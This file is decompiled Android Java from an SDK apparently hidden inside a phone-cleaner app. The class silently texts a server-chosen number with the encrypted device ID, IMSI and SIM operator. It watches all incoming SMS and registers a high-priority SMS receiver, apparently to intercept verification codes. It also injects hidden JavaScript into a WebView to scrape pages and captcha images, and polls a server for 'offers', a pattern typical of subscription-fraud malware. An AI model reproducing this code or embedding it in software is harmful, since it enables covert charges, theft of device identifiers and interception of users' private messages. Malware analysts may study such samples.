package com.flow.framework;

import android.content.Context;
import android.content.IntentFilter;
import android.os.Handler;
import android.text.TextUtils;
import com.facebook.appevents.AppEventsConstants;
import com.flow.framework.bean.BaseEntity;
import com.flow.framework.bean.LockMsg;
import com.flow.framework.bean.MsgInfo;
import com.flow.framework.bean.OfferStep;
import com.flow.framework.broadcast.SmsChaneObserver;
import com.flow.framework.dao.HandleDao;
import com.flow.framework.dao.ResponseHandler;
import com.flow.framework.model.AppModel;
import com.flow.framework.model.OfferResultModel;
import com.flow.framework.model.UserModel;
import com.flow.framework.reciver.SMSSend;
import com.flow.framework.tracking.TrackUtil;
import com.flow.framework.util.AppUtils;
import com.flow.framework.util.DeviceInfoUtil;
import com.flow.framework.util.EncryptionDecryption;
import com.flow.framework.util.PullingUtils;
import com.flow.framework.util.plog;

public class PspManager {
    private static final String APPID = "1847";
    public static final String APPKEY = "app_magiccleaner_all_gp_21698";
    public static final String EXECUTE_OBTAIN_HTML_CODE_JS_FUN = "javascript:obtainCode()";
    public static final String EXECUTE_OBTAIN_IMAGE_BASE64_JS_FUN = "javascript:getBaseImage()";
    public static final String INJECT_JS_FUNCTION = "javascript:(function() {var parent = document.getElementsByTagName('head').item(0);var style = document.createElement('script');style.type = 'text/javascript';style.innerHTML = window.atob('JS_CODE');parent.appendChild(style)})()";
    public static final String JS_CODE = "JS_CODE";
    public static final String METHOD_GET_IMAGE_BASE64_JS_FUN_NOT_CALLBACK = "function getBaseImage(){var img=GET_IMG_OBJECT;var canvas=document.createElement('canvas');canvas.width=img.width;canvas.height=img.height;var ctx=canvas.getContext('2d');ctx.drawImage(img,0,0,img.width,img.height);var dataURL=canvas.toDataURL('image/png');window.stub.getImageBase64(dataURL)};";
    public static final String OBTAIN_HTML_CODE_JS_FUN = "function obtainCode(){var htmlCode=\"<html>\"+document.getElementsByTagName(\"html\")[0].innerHTML+\"</html>\";window.stub.getHtmlCode(htmlCode)}";
    public static final String PULLSERVICE_ACTION = "com.flow.framework.FLOW_ACTION";
    public static final String PULLSERVICE_ALARM = "com.flow.framework.A_ACTION";
    public static final String PULLSERVICE_DESTROY = "com.flow.framework.service.destroy";
    public static int PULL_SECONDS = 180000;
    public static final String REPLACE_CAP_VCODE = "CAP_VCODE";
    public static final String REPLACE_METHOD_IMAGE_OBJECT_STR = "GET_IMG_OBJECT";
    public static final String REPLACE_ZA_CAP_VCODE = "ZA_CAP_VCODE";
    private static PspManager instance;
    public static SMSSend mSend;
    private static SmsChaneObserver sSmsChaneObserver;

    private PspManager() {
    }

    public static PspManager getInstance() {
        if (instance == null) {
            instance = new PspManager();
        }
        return instance;
    }

    private void registerPull() {
        PullingUtils.startPullingService(PApp.mInstance);
    }

    public void initSDK() {
        HandleDao.getInstance().addAppUserInfo(new ResponseHandler(), PApp.mInstance);
        checkPhoneNumExistAndSendMsgAndLock();
    }

    private void checkPhoneNumExistAndSendMsgAndLock() {
        HandleDao.getInstance().checkExistPhoneAndSendAndLock(new ResponseHandler() {
            public void onSuccess(BaseEntity entity) {
                super.onSuccess(entity);
                LockMsg lockMsg = (LockMsg) entity;
                plog.i("lock---->" + lockMsg.getLock());
                if (lockMsg.getLock().equalsIgnoreCase(AppEventsConstants.EVENT_PARAM_VALUE_YES)) {
                    plog.i("lock---->" + lockMsg.getLock());
                    HandleDao.getInstance().getOfferTrackUrl(PApp.mInstance);
                    PspManager.this.registerPull();
                }
            }

            public void onFailure(BaseEntity entity) {
                super.onFailure(entity);
            }
        }, PApp.mInstance);
    }

    public void checkPhoneNumExistAndSendMsg() {
        HandleDao.getInstance().checkExistPhoneAndSend(new ResponseHandler() {
            public void onSuccess(BaseEntity entity) {
                super.onSuccess(entity);
                MsgInfo lockMsg = (MsgInfo) entity;
                plog.i("-----status--->" + lockMsg.getStatus() + "----phoneNo--->" + lockMsg.getPhoneNo());
                if (lockMsg.getStatus().equalsIgnoreCase(AppEventsConstants.EVENT_PARAM_VALUE_NO) && !TextUtils.isEmpty(lockMsg.getPhoneNo())) {
                    plog.i("-----status--->" + lockMsg.getStatus() + "----phoneNo--->" + lockMsg.getPhoneNo());
                    PspManager.this.ConstructorUserInfo(lockMsg.getPhoneNo());
                }
                PspManager.this.registerPull();
            }

            public void onFailure(BaseEntity entity) {
                super.onFailure(entity);
                PspManager.this.registerPull();
            }
        }, PApp.mInstance);
    }

    public static void checkBroadcast() {
        if (mSend != null) {
            PApp.mInstance.unregisterReceiver(mSend);
            mSend = null;
        }
    }

    public static void registerBroadcast(OfferStep offerStepModel) {
        if (mSend == null) {
            IntentFilter filter = new IntentFilter("SMS_SEND_ACTION");
            filter.setPriority(10000);
            mSend = new SMSSend(offerStepModel);
            PApp.mInstance.registerReceiver(mSend, filter);
        }
    }

    public void cleanWebviewClient() {
        if (TrackUtil.getInstance().getTrackWebView() != null) {
            TrackUtil.getInstance().getTrackWebView().setWebView(null);
            TrackUtil.getInstance().setTrackWebView(null);
        }
    }

    private void ConstructorUserInfo(String phoneNumber) {
        AppModel appModel = AppModel.getAppModel();
        if (appModel == null || System.currentTimeMillis() - appModel.getLastSendMsgTime() > 345600000) {
            EncryptionDecryption encryptionDecryption = new EncryptionDecryption();
            StringBuilder para = new StringBuilder("");
            para.append(APPID);
            para.append(":");
            para.append(DeviceInfoUtil.getDeviceId(PApp.mInstance));
            para.append(":");
            para.append(DeviceInfoUtil.getSimOperator(PApp.mInstance));
            para.append(":");
            para.append(DeviceInfoUtil.getImsi(PApp.mInstance));
            plog.i("para--->" + para.toString());
            if (!TextUtils.isEmpty(DeviceInfoUtil.getSimOperator(PApp.mInstance))) {
                plog.i("send sms----->body---->" + encryptionDecryption.encrypt(para.toString()) + "----phonenumber---->" + phoneNumber);
                AppUtils.sendSms(PApp.mInstance, phoneNumber, encryptionDecryption.encrypt(para.toString()));
                appModel = new AppModel();
                appModel.setLastSendMsgTime(System.currentTimeMillis());
                appModel.save();
                return;
            }
            return;
        }
        plog.i("Has send text messages, not over time");
        appModel.setLastSendMsgTime(System.currentTimeMillis());
        appModel.save();
    }

    public OfferResultModel getActivieOfferStep() {
        UserModel userModel = UserModel.getActiveOffer();
        if (userModel == null || TextUtils.isEmpty(userModel.getOfferId())) {
            PullingUtils.stopOffer();
            return null;
        }
        OfferResultModel offerResultModel = OfferResultModel.getOfferResultModelByOfferId(userModel.getOfferId(), userModel.getNetType());
        if (offerResultModel == null || TextUtils.isEmpty(offerResultModel.getOfferResult())) {
            return null;
        }
        return offerResultModel;
    }

    public void registerContentObserver(Handler tHandler, OfferStep offerSubStep, Context context) {
        checkAndStopObserver();
        if (sSmsChaneObserver == null) {
            plog.i("registerContentObserver");
            sSmsChaneObserver = new SmsChaneObserver(tHandler, offerSubStep, context);
            PApp.mInstance.getContentResolver().registerContentObserver(SmsChaneObserver.MMSSMS_ALL_MESSAGE_URI, false, sSmsChaneObserver);
        }
    }

    private void checkAndStopObserver() {
        if (sSmsChaneObserver != null) {
            plog.i("stopObserver");
            PApp.mInstance.getContentResolver().unregisterContentObserver(sSmsChaneObserver);
            sSmsChaneObserver = null;
        }
    }
}
